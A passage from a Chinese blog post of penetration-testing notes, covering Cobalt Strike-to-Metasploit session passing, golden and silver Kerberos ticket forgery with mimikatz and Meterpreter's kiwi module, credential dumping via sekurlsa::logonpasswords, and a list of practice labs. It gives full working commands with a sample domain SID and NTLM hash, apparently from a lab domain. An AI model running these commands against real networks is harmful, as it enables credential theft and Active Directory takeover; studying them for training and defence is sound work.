<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>CS 添加监听器：foreign_http</pre></td></tr><tr><td data-num="2"></td><td><pre>    IP 为 MSF 地址</pre></td></tr><tr><td data-num="3"></td><td><pre>    </pre></td></tr><tr><td data-num="4"></td><td><pre>MSF 启动监听器：</pre></td></tr><tr><td data-num="5"></td><td><pre>    handler -H CS 服务器地址 -P 监听端口 -p windows&#x2F;meterpreter&#x2F;reverce_http</pre></td></tr><tr><td data-num="6"></td><td><pre>cs 上选择对应会话，凭据提取 -&gt; 新建会话</pre></td></tr></table></figure><p>2）利用</p>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>使用 meterpreter 中的 kiwi 模块：</pre></td></tr><tr><td data-num="2"></td><td><pre>	load kiwi</pre></td></tr><tr><td data-num="3"></td><td><pre>	</pre></td></tr><tr><td data-num="4"></td><td><pre>创建票据</pre></td></tr><tr><td data-num="5"></td><td><pre>	命令格式：golden_ticket_create -d &lt;域名&gt; -u &lt; 任意用户名 &gt; -s &lt;Domain SID&gt; -k &lt;krbtgt NTLM Hash&gt; -t &lt;ticket 本地存储路径如:&#x2F;tmp&#x2F;krbtgt.ticket&gt;</pre></td></tr></table></figure><h3 id="白银票据"><a class="anchor" href="#白银票据">#</a> 白银票据</h3>
<blockquote>
<p>特点</p>
</blockquote>
<ul>
<li>
<p>无需与 KDC 交互</p>
</li>
<li>
<p>需要目标服务器的 NTLM hash--- 服务类型</p>
</li>
</ul>
<h4 id="信息收集-2"><a class="anchor" href="#信息收集-2">#</a> 信息收集</h4>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>域名 net time &#x2F;domain    ipconfig &#x2F;all </pre></td></tr><tr><td data-num="2"></td><td><pre>域的 SID 值 (去掉最后的 500)  wmic useraccount get name,sid</pre></td></tr><tr><td data-num="3"></td><td><pre>目标机器的 FQDN  net time &#x2F;domain  就是 hostname + 域名 &#x2F;target:\\WIN-75NA0949GFB.god.org</pre></td></tr><tr><td data-num="4"></td><td><pre>可利用的服务 CIFS (磁盘共享的服务) &#x2F;service:CIFS   </pre></td></tr><tr><td data-num="5"></td><td><pre>要伪造的用户名  &#x2F;user:Administrator</pre></td></tr><tr><td data-num="6"></td><td><pre>服务账号的 ntlm hash (Primary Username : WIN-75NA0949GFB$ 带 $ 的 hash，不是 admin 的) &#x2F;rc4:08d93ddf15a6309a46daaa7ec8565296</pre></td></tr><tr><td data-num="7"></td><td><pre># 生成了 mimikatz.log 文件 (域控主机执行)</pre></td></tr><tr><td data-num="8"></td><td><pre>mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>&#x2F;user: 要伪造的目标用户 &#x2F; 计算机 Target Account&#x2F;Computer to Impersonate</pre></td></tr><tr><td data-num="11"></td><td><pre>&#x2F;ptt: Optional (Will Inject Ticket or you can do with Rubeus)</pre></td></tr><tr><td data-num="12"></td><td><pre>&#x2F;service:cifs   服务参数为 cifs</pre></td></tr><tr><td data-num="13"></td><td><pre>&#x2F;domain    参数为域名</pre></td></tr><tr><td data-num="14"></td><td><pre>&#x2F;sid       参数为域 sid (whoami &#x2F;user)</pre></td></tr><tr><td data-num="15"></td><td><pre>&#x2F;target    The FDQN 指定域内的机器  &#x2F;target:WIN-75NA0949GFB.god.org</pre></td></tr><tr><td data-num="16"></td><td><pre>&#x2F;rc4       服务账号的 ntml hash</pre></td></tr><tr><td data-num="17"></td><td><pre>&#x2F;user      需要伪造的用户名  NTLM Hash of User Password&#x2F;Computer Password</pre></td></tr></table></figure><h4 id="获取服务器ntlm-hash"><a class="anchor" href="#获取服务器ntlm-hash">#</a> 获取服务器 NTLM hash</h4>
<pre><code class="language-cmd">服务器服务NTLM hash: 计算机名+$

mimikatz privilege::debug 
mimikatz sekurlsa::logonpasswords
</code></pre>
<h4 id="伪造过程"><a class="anchor" href="#伪造过程">#</a> 伪造过程</h4>
<pre><code class="language-cmd">格式：mimikatz kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器FQDN&gt; /service:&lt;服务类型&gt; /rc4:&lt;服务账号NTLM Hash&gt; /user:&lt;需要伪造的用户名&gt; /ptt

FQDN：计算机名+域名
域控制：OWA2010CN-God.god.org


OWA2010CN-GOD$:2c86f8495f015ed909fa0c158da87914

用普通用户执行：
格式：mimikatz kerberos::golden /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:OWA2010CN-God.god.org /service:cifs /rc4:2c86f8495f015ed909fa0c158da87914 /user:administrator /ptt
</code></pre>
<h3 id="区别"><a class="anchor" href="#区别">#</a> 区别</h3>
<p><strong>访问权限不同</strong></p>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>TGT：可以获取任何 kerberos 服务权限</pre></td></tr><tr><td data-num="2"></td><td><pre>TGS：只能访问指定的服务</pre></td></tr></table></figure><p><strong>加密方式不同</strong></p>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>TGT：由 kerberos 的 hash 加密</pre></td></tr><tr><td data-num="2"></td><td><pre>TGS：由服务器密码的 Hash 加密</pre></td></tr></table></figure><p><strong>认证流程不同</strong></p>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>TGT：需要和域控交互</pre></td></tr><tr><td data-num="2"></td><td><pre>TGS：直接跳过域控访问对应服务器</pre></td></tr></table></figure><figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>重点提示：</pre></td></tr><tr><td data-num="2"></td><td><pre>ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage : c000000d 经过我的一系列实验，域成员主机如果为 windows xp 或 windows server 2003，是无法正常伪造票据的</pre></td></tr></table></figure><h1 id="靶场"><a class="anchor" href="#靶场">#</a> 靶场</h1>
<figure class="highlight raw"><figcaption data-lang=""></figcaption><table><tr><td data-num="1"></td><td><pre>BLUE-LOTUS		## XSS 构造模板靶场</pre></td></tr><tr><td data-num="2"></td><td><pre>TLXSS 平台			## xss 构造模板平台</pre></td></tr><tr><td data-num="3"></td><td><pre>Beef-Xss		## XSS 工具（Kali 自带）</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>sqli-labs		## sql 注入靶场</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>exphub			## exp 靶场</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>pikachu			## 漏洞通用靶场</pre></td></tr><tr><td data-num="10"></td><td><pre>awvs			## 漏洞通用靶场</pre></td></tr><tr><td data-num="11"></td><td><pre>vulfocus		## 漏洞集合靶场</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>update-labs		## 文件上传靶场</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>xxe-lab			## XXE 靶场</pre></td></tr><tr><td data-num="16"></td><td><pre>portSwigger		## 逻辑靶场</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>ctf.show		##ctf 靶场</pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>doraBox</pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>BruteForc</pre></td></tr><tr><td data-num="23"></td><td><pre>vulmap</pre></td></tr><tr><td data-num="24"></td><td><pre>appscan</pre></td></tr><tr><td data-num="25"></td><td><pre>xray</pre></td></tr></table></figure></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2025-05-24 11:42:00" itemprop="dateModified" datetime="2025-05-24T11:42:00+08:00">2025-05-24</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>辰海星<i class="ic i-at"><em>@</em></i>✨星星之火，可以燎原🔥</li><li class="link"><strong>本文链接：</strong><a href="https://chxpro.me/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.html" title="渗透笔记">https://chxpro.me/渗透/渗透笔记.html</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80.html" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;t.alcy.cc&#x2F;moez?900934" title="免杀工具"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>渗透</span><h3>免杀工具</h3></a></div><div class="item right"><a href="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6.html" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;t.alcy.cc&#x2F;moez?584716" title="渗透常用软件"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>渗透</span><h3>渗透常用软件</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87"><span class="toc-number">1.</span> <span class="toc-text"> 确定目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text"> 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text"> 搜索语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#google"><span class="toc-number">3.1.</span> <span class="toc-text"> Google</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98fofa"><span class="toc-number">3.2.</span> <span class="toc-text"> 空间测绘 (fofa)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5mysql"><span class="toc-number">4.</span> <span class="toc-text"> SQL 注入（mysql）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">4.1.</span> <span class="toc-text"> 查询数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6"><span class="toc-number">4.2.</span> <span class="toc-text"> 权限控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%E8%A1%A8"><span class="toc-number">4.3.</span> <span class="toc-text"> 重点表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%BD%E6%95%B0"><span class="toc-number">4.4.</span> <span class="toc-text"> 数据库函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text"> 联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.6.</span> <span class="toc-text"> 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.7.</span> <span class="toc-text"> 盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.8.</span> <span class="toc-text"> 注入语句示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">5.</span> <span class="toc-text"> XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#csp%E7%AD%96%E7%95%A5"><span class="toc-number">5.1.</span> <span class="toc-text"> CSP 策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text"> 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#update-labs%E6%94%BB%E7%95%A5php"><span class="toc-number">6.1.</span> <span class="toc-text"> update-labs 攻略（php）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABphp"><span class="toc-number">7.</span> <span class="toc-text"> 文件包含（php）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf"><span class="toc-number">8.</span> <span class="toc-text"> CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dvwa"><span class="toc-number">8.1.</span> <span class="toc-text"> DVWA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88xss"><span class="toc-number">8.2.</span> <span class="toc-text"> 结合 XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">9.</span> <span class="toc-text"> SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">9.1.</span> <span class="toc-text"> 绕过思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">9.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.</span> <span class="toc-text"> RCE 任意命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7"><span class="toc-number">10.1.</span> <span class="toc-text"> 挖掘技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text"> XXE 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7-2"><span class="toc-number">11.1.</span> <span class="toc-text"> 挖掘技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text"> 反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">13.</span> <span class="toc-text"> 逻辑漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">14.</span> <span class="toc-text"> 漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%8C%96%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">15.</span> <span class="toc-text"> 配置挖洞环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number"></span> <span class="toc-text"> 内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#msf"><span class="toc-number">1.</span> <span class="toc-text"> MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter"><span class="toc-number">2.</span> <span class="toc-text"> Meterpreter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom-payload%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text"> msfvenom-payload 木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cscobalt-strike"><span class="toc-number">4.</span> <span class="toc-text"> CS（Cobalt Strike）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text"> windows 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text"> linux 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text"> 数据库提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">8.</span> <span class="toc-text"> windows 权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">9.</span> <span class="toc-text"> Linux 权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">10.</span> <span class="toc-text"> 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">10.1.</span> <span class="toc-text"> 密码喷洒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">10.2.</span> <span class="toc-text"> 黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7hash"><span class="toc-number">10.2.1.</span> <span class="toc-text"> 获取 krbtgt 用户 hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">10.2.2.</span> <span class="toc-text"> 伪造黄金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8msf%E6%9D%A5%E4%BC%AA%E9%80%A0"><span class="toc-number">10.2.3.</span> <span class="toc-text"> 利用 MSF 来伪造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">10.3.</span> <span class="toc-text"> 白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">10.3.1.</span> <span class="toc-text"> 信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8ntlm-hash"><span class="toc-number">10.3.2.</span> <span class="toc-text"> 获取服务器 NTLM hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E8%BF%87%E7%A8%8B"><span class="toc-number">10.3.3.</span> <span class="toc-text"> 伪造过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB"><span class="toc-number">10.4.</span> <span class="toc-text"> 区别</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA"><span class="toc-number"></span> <span class="toc-text"> 靶场</span></a></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80.html" rel="bookmark" title="免杀工具">免杀工具</a></li><li  class="active"><a href="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.html" rel="bookmark" title="渗透笔记">渗透笔记</a></li><li ><a href="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6.html" rel="bookmark" title="渗透常用软件">渗透常用软件</a></li><li ><a href="/%E6%B8%97%E9%80%8F/HW.html" rel="bookmark" title="HW">HW</a></li><li ><a href="/%E6%B8%97%E9%80%8F/%E6%98%93%E9%94%A6CTF.html" rel="bookmark" title="易锦CTF">易锦CTF</a></li><li ><a href="/%E5%91%BD%E4%BB%A4/Windows%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html" rel="bookmark" title="Windows渗透常用命令">Windows渗透常用命令</a></li><li ><a href="/%E5%91%BD%E4%BB%A4/linux%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html" rel="bookmark" title="linux渗透常用命令">linux渗透常用命令</a></li><li ><a href="/%E5%91%BD%E4%BB%A4/sqlmap%E5%91%BD%E4%BB%A4.html" rel="bookmark" title="sqlmap命令">sqlmap命令</a></li><li ><a href="/%E5%91%BD%E4%BB%A4/nmap%E5%91%BD%E4%BB%A4.html" rel="bookmark" title="nmap命令">nmap命令</a></li><li ><a href="/%E5%91%BD%E4%BB%A4/nc%E5%91%BD%E4%BB%A4.html" rel="bookmark" title="nc命令">nc命令</a></li><li ><a href="/%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BA%8C%E8%BF%9B%E5%88%B6.html" rel="bookmark" title="文件头二进制">文件头二进制</a></li><li ><a href="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93.html" rel="bookmark" title="渗透测试全流程总结">渗透测试全流程总结</a></li><li ><a href="/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%90%88%E9%9B%86.html" rel="bookmark" title="网络渗透工具合集">网络渗透工具合集</a></li><li ><a href="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%B2%97%E4%BD%8D.html" rel="bookmark" title="渗透岗位">渗透岗位</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="辰海星" src="/assets/avatar.jpeg"/><p class="name" itemprop="name">辰海星</p><div class="description" itemprop="description">NPC也有悲惨的剧情</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">44</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span><span class="name">分类</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/chxcodepro" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;chxcodepro"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="/categories/" rel="section"><i class="ic i-coffee"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-archive"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li></ul></li><li class="item"><a href="/life/" rel="section"><i class="ic i-heart"></i>生活</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item"><a href="/password/" rel="section"><i class="ic i-eye"></i>闺房</a></li><li class="item"><a href="/node/" rel="section"><i class="ic i-tags"></i>节点</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"></div><div class="status"><div class="copyright">&copy; 2024 -<span itemprop="copyrightYear">2025</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">辰海星 @ STAR✨WORLD</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">206k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">3:08</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div><div style="width: 100%;text-align:center;"><span id="time"></span></div><script>function createtime() {
    const n = new Date("2023/07/10 00:00:00");
    now.setTime(now.getTime() + 250), days = (now - n) / 1e3 / 60 / 60 / 24, dnum = Math.floor(days), hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum, hnum = Math.floor(hours), 1 == String(hnum).length && (hnum = "0" + hnum), minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum, mnum = Math.floor(minutes), 1 == String(mnum).length && (mnum = "0" + mnum), seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum, snum = Math.round(seconds), 1 == String(snum).length && (snum = "0" + snum), document.getElementById("time").innerHTML = "此站已存活" + dnum + " 天 " + hnum + " 小时 " + mnum + " 分 " + snum + " 秒"
}

const now = new Date;
setInterval("createtime()", 250)</script></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
    ispost: true,
    path: `渗透/渗透笔记.html`,
    favicon: {
        show: `（●´3｀●）やれやれだぜ`,
        hide: `(´Д｀)大変だ！`
    },
    search: {
        placeholder: "文章搜索",
        empty: "关于 「 ${query} 」，什么也没搜到",
        stats: "${time} ms 内找到 ${hits} 条结果"
    },
    nocopy: "false",
    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
    quiz: {
        choice: `单选题`,
        multiple: `多选题`,
        true_false: `判断题`,
        essay: `问答题`,
        gap_fill: `填空题`,
        mistake: `错题备注`
    }
};
</script><script src="/js/siteInit.js?v=0.5.0" type="module" fetchpriority="high" defer></script></body></html>